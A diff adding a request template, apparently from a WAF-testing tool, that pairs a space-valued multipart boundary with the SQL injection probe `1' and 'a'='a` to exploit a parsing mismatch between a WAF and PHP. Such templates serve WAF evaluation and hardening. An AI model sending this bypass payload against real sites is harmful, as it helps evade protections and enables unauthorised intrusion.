@@ -1,0 +1,19 @@
+# @name: multipart空格boundary
+# @tags: post,multipart,space-boundary,php,id,bypass
+# @color: rose
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: multipart_space_boundary
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: boundary 的值为一个空格(而非空字符串)，WAF 与 PHP 对空格 boundary 的容错处理不同，可造成解析不一致。参考 do9gy multipart Part1 第9条。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: multipart/form-data; boundary= 
+
+-- 
+Content-Disposition: form-data; name="id"
+
+1' and 'a'='a
+-- --
